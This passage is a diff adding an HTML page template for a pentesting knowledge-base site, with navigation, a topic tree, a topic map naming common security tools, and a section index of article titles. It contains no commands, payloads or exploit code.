@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" />
+<link href="https://fonts.googleapis.com/css2?family=Spectral:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet" />
+<style>
+  html, body { margin: 0; padding: 0; background: oklch(0.155 0.006 80); }
+  body { -webkit-font-smoothing: antialiased; }
+  a { color: oklch(0.80 0.13 72); text-decoration: none; }
+  a:hover { color: oklch(0.88 0.13 72); text-decoration: underline; }
+  ::selection { background: oklch(0.80 0.13 72 / 0.28); }
+  * { box-sizing: border-box; }
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-thumb { background: oklch(0.30 0.006 80); border-radius: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+</style>
+</helmet>
+
+<div style="min-height: 100vh; background: oklch(0.155 0.006 80); color: oklch(0.93 0.006 80); font-family: 'IBM Plex Mono', ui-monospace, monospace; font-size: 13.5px; line-height: 1.65;">
+
+  <header style="position: sticky; top: 0; z-index: 50; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; padding: 0 18px; height: 54px; background: oklch(0.175 0.006 80); border-bottom: 1px solid oklch(0.30 0.006 80);">
+    <sc-if value="{{ isNarrow }}">
+      <div onClick="{{ toggleSidebar }}" style="display: flex; flex-direction: column; gap: 3px; cursor: pointer; padding: 6px; margin-left: -6px;" style-hover="opacity: 0.8;">
+        <span style="width: 18px; height: 2px; background: oklch(0.86 0.006 80);"></span>
+        <span style="width: 18px; height: 2px; background: oklch(0.86 0.006 80);"></span>
+        <span style="width: 18px; height: 2px; background: oklch(0.86 0.006 80);"></span>
+      </div>
+    </sc-if>
+    <div onClick="{{ goHome }}" style="display: flex; align-items: baseline; gap: 8px; cursor: pointer; padding-right: 18px; border-right: 1px solid oklch(0.30 0.006 80); height: 100%; align-content: center; flex-wrap: wrap;">
+      <span style="font-family: Spectral, Georgia, serif; font-size: 21px; font-weight: 600; letter-spacing: -0.01em; color: oklch(0.96 0.006 80);">Nullpath</span>
+    </div>
+
+    <nav style="display: flex; gap: 2px; flex-wrap: wrap;">
+      <div onClick="{{ goHome }}" style="padding: 5px 10px; cursor: pointer; font-size: 12px; letter-spacing: 0.02em; border-radius: 3px; color: {{ homeColor }};" style-hover="background: oklch(0.22 0.006 80); color: oklch(0.95 0.006 80);">Home</div>
+      <div onClick="{{ goSection }}" style="padding: 5px 10px; cursor: pointer; font-size: 12px; letter-spacing: 0.02em; border-radius: 3px; color: {{ sectionColor }};" style-hover="background: oklch(0.22 0.006 80); color: oklch(0.95 0.006 80);">Section index</div>
+      <div onClick="{{ goArticle }}" style="padding: 5px 10px; cursor: pointer; font-size: 12px; letter-spacing: 0.02em; border-radius: 3px; color: {{ articleColor }};" style-hover="background: oklch(0.22 0.006 80); color: oklch(0.95 0.006 80);">Article</div>
+      <div onClick="{{ goCheat }}" style="padding: 5px 10px; cursor: pointer; font-size: 12px; letter-spacing: 0.02em; border-radius: 3px; color: {{ cheatColor }};" style-hover="background: oklch(0.22 0.006 80); color: oklch(0.95 0.006 80);">Cheatsheet</div>
+      <div onClick="{{ goSearch }}" style="padding: 5px 10px; cursor: pointer; font-size: 12px; letter-spacing: 0.02em; border-radius: 3px; color: {{ searchColor }};" style-hover="background: oklch(0.22 0.006 80); color: oklch(0.95 0.006 80);">Search</div>
+    </nav>
+
+    <div style="flex: 1;"></div>
+
+    <div onClick="{{ openPalette }}" style="display: flex; align-items: center; gap: 8px; min-width: 190px; padding: 5px 9px; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.30 0.006 80); border-radius: 3px; cursor: text; color: oklch(0.55 0.008 80); font-size: 12px;">
+      <span style="color: oklch(0.80 0.13 72);">/</span>
+      <span>search 812 pages</span>
+    </div>
+  </header>
+
+  <sc-if value="{{ isArticle }}">
+    <div style="position: sticky; top: 54px; z-index: 30; height: 2px; background: oklch(0.24 0.006 80);">
+      <div style="height: 100%; width: {{ readProgress }}; background: oklch(0.80 0.13 72); transition: width 0.1s linear;"></div>
+    </div>
+  </sc-if>
+
+  <sc-if value="{{ showBackdrop }}">
+    <div onClick="{{ closeSidebar }}" style="position: fixed; inset: 54px 0 0 0; background: rgba(0,0,0,0.5); z-index: 35;"></div>
+  </sc-if>
+
+  <div style="display: grid; grid-template-columns: {{ gridCols }}; align-items: start;">
+
+    <aside style="position: sticky; top: 54px; align-self: start; max-height: calc(100vh - 54px); overflow: auto; border-right: 1px solid oklch(0.26 0.006 80); padding: 18px 0 40px 0; background: oklch(0.165 0.006 80); {{ asideExtra }}">
+      <div style="padding: 0 16px 10px 16px; font-size: 9.5px; letter-spacing: 0.16em; text-transform: uppercase; color: oklch(0.58 0.008 80);">Knowledge base</div>
+
+      <div style="padding: 0 8px;">
+        <div style="display: flex; align-items: center; gap: 4px; padding: 5px 8px; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span onClick="{{ toggleWeb }}" style="width: 14px; cursor: pointer; color: oklch(0.62 0.008 80); font-size: 10px;">{{ webCaret }}</span>
+          <span onClick="{{ goWeb }}" style="flex: 1; cursor: pointer;">Web Pentesting</span><span style="color: oklch(0.50 0.008 80); cursor: pointer;" onClick="{{ goWeb }}">124</span>
+        </div>
+        <sc-if value="{{ webOpen }}" hint-placeholder-val="{{ true }}">
+        <div style="margin-left: 12px; border-left: 1px solid oklch(0.28 0.006 80); padding-left: 8px;">
+          <div onClick="{{ goArticle }}" style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">SQL Injection</div>
+          <div style="margin-left: 10px; border-left: 1px solid oklch(0.28 0.006 80); padding-left: 8px;">
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">MySQL</div>
+            <div style="margin-left: 10px; border-left: 1px solid oklch(0.28 0.006 80); padding-left: 8px;">
+              <div style="padding: 3px 8px; color: oklch(0.70 0.008 80); font-size: 12.5px; cursor: pointer;" style-hover="color: oklch(0.90 0.006 80);">Union-based</div>
+              <div style="padding: 3px 8px; color: oklch(0.70 0.008 80); font-size: 12.5px; cursor: pointer;" style-hover="color: oklch(0.90 0.006 80);">Blind / time-based</div>
+              <div style="padding: 3px 8px; color: oklch(0.70 0.008 80); font-size: 12.5px; cursor: pointer;" style-hover="color: oklch(0.90 0.006 80);">WAF bypass</div>
+            </div>
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">PostgreSQL</div>
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">MSSQL</div>
+          </div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">Command Injection</div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">SSRF</div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">File Upload</div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">Deserialization</div>
+        </div>
+        </sc-if>
+
+        <div style="display: flex; align-items: center; gap: 4px; padding: 5px 8px; margin-top: 6px; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span onClick="{{ toggleAd }}" style="width: 14px; cursor: pointer; color: oklch(0.62 0.008 80); font-size: 10px;">{{ adCaret }}</span>
+          <span onClick="{{ goAd }}" style="flex: 1; cursor: pointer;">Active Directory</span><span style="color: oklch(0.50 0.008 80); cursor: pointer;" onClick="{{ goAd }}">98</span>
+        </div>
+        <sc-if value="{{ adOpen }}" hint-placeholder-val="{{ true }}">
+        <div style="margin-left: 12px; border-left: 1px solid oklch(0.28 0.006 80); padding-left: 8px;">
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">Enumeration</div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">Kerberos</div>
+          <div style="margin-left: 10px; border-left: 1px solid oklch(0.28 0.006 80); padding-left: 8px;">
+            <div onClick="{{ goArticle }}" style="padding: 4px 8px; margin-left: -9px; padding-left: 16px; border-left: 2px solid oklch(0.80 0.13 72); background: oklch(0.80 0.13 72 / 0.10); color: oklch(0.88 0.13 72); cursor: pointer;">Kerberoasting</div>
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer;" style-hover="color: oklch(0.94 0.006 80);">AS-REP Roasting</div>
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer;" style-hover="color: oklch(0.94 0.006 80);">Unconstrained delegation</div>
+            <div style="padding: 4px 8px; color: oklch(0.80 0.008 80); cursor: pointer;" style-hover="color: oklch(0.94 0.006 80);">Golden &amp; Silver tickets</div>
+          </div>
+          <div style="padding: 4px 8px; color: oklch(0.86 0.006 80); cursor: pointer; border-radius: 3px;" style-hover="background: oklch(0.21 0.006 80);">ACL abuse</div>
+        </div>
+        </sc-if>
+
+        <div style="display: flex; justify-content: space-between; padding: 5px 8px; margin-top: 6px; cursor: pointer; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span>Linux Privesc</span><span style="color: oklch(0.50 0.008 80);">67</span>
+        </div>
+        <div onClick="{{ goRecon }}" style="display: flex; justify-content: space-between; padding: 5px 8px; margin-top: 2px; cursor: pointer; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span>Network &amp; Recon</span><span style="color: oklch(0.50 0.008 80);">81</span>
+        </div>
+        <div onClick="{{ goCloud }}" style="display: flex; justify-content: space-between; padding: 5px 8px; margin-top: 2px; cursor: pointer; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span>Cloud</span><span style="color: oklch(0.50 0.008 80);">54</span>
+        </div>
+        <div style="display: flex; justify-content: space-between; padding: 5px 8px; margin-top: 2px; cursor: pointer; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span>Mobile</span><span style="color: oklch(0.50 0.008 80);">39</span>
+        </div>
+        <div style="display: flex; justify-content: space-between; padding: 5px 8px; margin-top: 2px; cursor: pointer; border-radius: 3px; color: oklch(0.94 0.006 80); font-weight: 500;" style-hover="background: oklch(0.21 0.006 80);">
+          <span>Blue Team Notes</span><span style="color: oklch(0.50 0.008 80);">44</span>
+        </div>
+      </div>
+
+      <div style="margin: 22px 16px 0 16px; padding-top: 14px; border-top: 1px solid oklch(0.26 0.006 80); font-size: 11.5px; color: oklch(0.58 0.008 80);">
+        <div onClick="{{ goTools }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Tool arsenal</span><span>↗</span></div>
+        <div onClick="{{ goPayloads }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Payload library</span><span>↗</span></div>
+        <div onClick="{{ goContribute }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Contribute a page</span><span>↗</span></div>
+        <div onClick="{{ goStyleGuide }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Style guide</span><span>↗</span></div>
+        <div onClick="{{ goChangelog }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Changelog</span><span>↗</span></div>
+        <div onClick="{{ goLeaderboard }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>Contributor leaderboard</span><span>↗</span></div>
+        <div onClick="{{ goAbout }}" style="display: flex; justify-content: space-between; padding: 3px 0; cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);"><span>About Nullpath</span><span>↗</span></div>
+      </div>
+    </aside>
+
+    <main style="min-width: 0;">
+
+      <sc-if value="{{ isHome }}" hint-placeholder-val="{{ true }}">
+        <div>
+          <section style="padding: 64px 40px 44px 40px; border-bottom: 1px solid oklch(0.26 0.006 80);">
+            <div style="max-width: 760px;">
+              <div style="font-size: 10px; letter-spacing: 0.18em; text-transform: uppercase; color: oklch(0.80 0.13 72); margin-bottom: 18px;">812 pages · 63 contributors · updated daily</div>
+              <h1 style="font-family: Spectral, Georgia, serif; font-size: 46px; line-height: 1.12; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 18px 0; color: oklch(0.97 0.006 80); text-wrap: pretty;">A working reference for hacking and pentesting technique.</h1>
+              <p style="margin: 0 0 26px 0; font-size: 14px; max-width: 620px; color: oklch(0.78 0.008 80); text-wrap: pretty;">Notes written the way they get used: enumerate, exploit, escalate, clean up. Every page carries the commands, the payloads, the detection footprint, and what to check when it fails.</p>
+              <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <div onClick="{{ goArticle }}" style="padding: 9px 16px; background: oklch(0.80 0.13 72); color: oklch(0.16 0.03 72); font-weight: 600; font-size: 12.5px; border-radius: 3px; cursor: pointer; letter-spacing: 0.02em;">Start with the basics</div>
+                <div onClick="{{ goCheat }}" style="padding: 9px 16px; border: 1px solid oklch(0.34 0.006 80); color: oklch(0.90 0.006 80); font-size: 12.5px; border-radius: 3px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72); color: oklch(0.88 0.13 72);">Open the cheatsheets</div>
+              </div>
+            </div>
+          </section>
+
+          <section style="padding: 34px 40px 12px 40px;">
+            <div style="display: flex; align-items: baseline; justify-content: space-between; margin-bottom: 16px;">
+              <h2 style="font-family: Spectral, Georgia, serif; font-size: 20px; font-weight: 600; margin: 0; color: oklch(0.96 0.006 80);">Topic map</h2>
+              <span style="font-size: 11px; color: oklch(0.58 0.008 80);">by kill-chain phase</span>
+            </div>
+            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(258px, 1fr)); gap: 1px; background: oklch(0.26 0.006 80); border: 1px solid oklch(0.26 0.006 80);">
+              <div onClick="{{ goCheat }}" style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Recon &amp; Enumeration</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">81</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">Port scanning, service fingerprinting, subdomain and DNS work, OSINT.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">nmap</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">ffuf</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">amass</span>
+                </div>
+              </div>
+              <div onClick="{{ goSection }}" style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Web Pentesting</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">124</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">Injection, access control, SSRF, upload chains, deserialization, auth flaws.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">sqlmap</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">burp</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">payloads</span>
+                </div>
+              </div>
+              <div onClick="{{ goArticle }}" style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Active Directory</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">98</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">Kerberos abuse, delegation, ACL paths, credential theft, domain persistence.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">impacket</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">bloodhound</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">rubeus</span>
+                </div>
+              </div>
+              <div style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Privilege Escalation</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">67</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">SUID and capability abuse, cron paths, kernel exploits, Windows tokens.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">linpeas</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">gtfobins</span>
+                </div>
+              </div>
+              <div style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Cloud &amp; Container</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">54</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">IAM privilege paths, metadata abuse, S3 and bucket work, K8s escapes.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">pacu</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">kubectl</span>
+                </div>
+              </div>
+              <div onClick="{{ goCheat }}" style="background: oklch(0.175 0.006 80); padding: 18px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.96 0.006 80);">Blue Team Notes</span>
+                  <span style="font-size: 11px; color: oklch(0.55 0.008 80);">44</span>
+                </div>
+                <p style="margin: 0 0 12px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">What each technique leaves behind: event IDs, log artifacts, hunt queries.</p>
+                <div style="display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: oklch(0.62 0.008 80);">
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">sigma</span>
+                  <span style="border: 1px solid oklch(0.30 0.006 80); padding: 1px 6px;">kql</span>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <section style="padding: 34px 40px 60px 40px; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 34px;">
+            <div>
+              <h2 style="font-family: Spectral, Georgia, serif; font-size: 20px; font-weight: 600; margin: 0 0 14px 0; color: oklch(0.96 0.006 80);">Recently updated</h2>
+              <div onClick="{{ goArticle }}" style="display: flex; gap: 14px; padding: 11px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer;">
+                <span style="min-width: 66px; font-size: 11.5px; color: oklch(0.56 0.008 80);">04 Sep</span>
+                <span style="flex: 1; color: oklch(0.92 0.006 80);">Kerberoasting</span>
+                <span style="font-size: 11px; color: oklch(0.80 0.13 72);">rewritten</span>
+              </div>
+              <div style="display: flex; gap: 14px; padding: 11px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer;">
+                <span style="min-width: 66px; font-size: 11.5px; color: oklch(0.56 0.008 80);">03 Sep</span>
+                <span style="flex: 1; color: oklch(0.92 0.006 80);">SQLi · MySQL WAF bypass</span>
+                <span style="font-size: 11px; color: oklch(0.58 0.008 80);">+9 payloads</span>
+              </div>
+              <div style="display: flex; gap: 14px; padding: 11px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer;">
+                <span style="min-width: 66px; font-size: 11.5px; color: oklch(0.56 0.008 80);">02 Sep</span>
+                <span style="flex: 1; color: oklch(0.92 0.006 80);">IMDSv2 SSRF pivots</span>
+                <span style="font-size: 11px; color: oklch(0.58 0.008 80);">new</span>
+              </div>
+              <div style="display: flex; gap: 14px; padding: 11px 0; border-top: 1px solid oklch(0.26 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); cursor: pointer;">
+                <span style="min-width: 66px; font-size: 11.5px; color: oklch(0.56 0.008 80);">31 Aug</span>
+                <span style="flex: 1; color: oklch(0.92 0.006 80);">Linux capabilities privesc</span>
+                <span style="font-size: 11px; color: oklch(0.58 0.008 80);">edited</span>
+              </div>
+            </div>
+            <div>
+              <h2 style="font-family: Spectral, Georgia, serif; font-size: 20px; font-weight: 600; margin: 0 0 14px 0; color: oklch(0.96 0.006 80);">Learning paths</h2>
+              <div style="border: 1px solid oklch(0.26 0.006 80); padding: 14px 16px; margin-bottom: 10px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72 / 0.5);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;"><span style="color: oklch(0.94 0.006 80);">First internal engagement</span><span style="font-size: 11px; color: oklch(0.58 0.008 80);">14 pages</span></div>
+                <p style="margin: 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">Domain recon → credential access → lateral movement → reporting.</p>
+              </div>
+              <div style="border: 1px solid oklch(0.26 0.006 80); padding: 14px 16px; margin-bottom: 10px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72 / 0.5);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;"><span style="color: oklch(0.94 0.006 80);">Web app from zero</span><span style="font-size: 11px; color: oklch(0.58 0.008 80);">21 pages</span></div>
+                <p style="margin: 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">HTTP fundamentals through injection, auth and business-logic testing.</p>
+              </div>
+              <div style="border: 1px solid oklch(0.26 0.006 80); padding: 14px 16px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72 / 0.5);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;"><span style="color: oklch(0.94 0.006 80);">CTF speedrun kit</span><span style="font-size: 11px; color: oklch(0.58 0.008 80);">9 pages</span></div>
+                <p style="margin: 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">The checks that solve most boxes in the first twenty minutes.</p>
+              </div>
+            </div>
+          </section>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isSection }}">
+        <div style="padding: 26px 40px 60px 40px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">{{ sectionTitle }}</span>
+          </div>
+          <div style="max-width: 740px; margin-bottom: 30px;">
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 36px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 12px 0; color: oklch(0.97 0.006 80);">{{ sectionTitle }}</h1>
+            <p style="margin: 0; font-size: 14px; color: oklch(0.78 0.008 80); text-wrap: pretty;">{{ sectionDesc }}</p>
+          </div>
+
+          <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 26px;">
+            <span style="padding: 4px 10px; font-size: 11.5px; background: oklch(0.80 0.13 72 / 0.14); border: 1px solid oklch(0.80 0.13 72 / 0.4); color: oklch(0.88 0.13 72); cursor: pointer;">All</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Injection</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Access control</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Auth</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Server-side</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Client-side</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Beginner</span>
+          </div>
+
+          <div style="border: 1px solid oklch(0.26 0.006 80);">
+            <div style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 9px 16px; background: oklch(0.19 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: oklch(0.58 0.008 80);">
+              <span>Page</span><span>Level</span><span>Tags</span><span>Updated</span>
+            </div>
+            <div onClick="{{ goArticle }}" style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">SQL Injection — methodology</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Detect, fingerprint, extract. Covers all four DBMS families.</div></div>
+              <span style="font-size: 11px; color: oklch(0.80 0.13 72);">core</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">injection</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">03 Sep</span>
+            </div>
+            <div style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">Blind SQLi — time-based extraction</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Binary search over SLEEP, plus scripting the oracle.</div></div>
+              <span style="font-size: 11px; color: oklch(0.76 0.008 80);">advanced</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">injection</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">28 Aug</span>
+            </div>
+            <div style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">SSRF and metadata pivots</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Reaching internal services, cloud metadata, and gopher chains.</div></div>
+              <span style="font-size: 11px; color: oklch(0.76 0.008 80);">intermediate</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">server-side</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">02 Sep</span>
+            </div>
+            <div style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
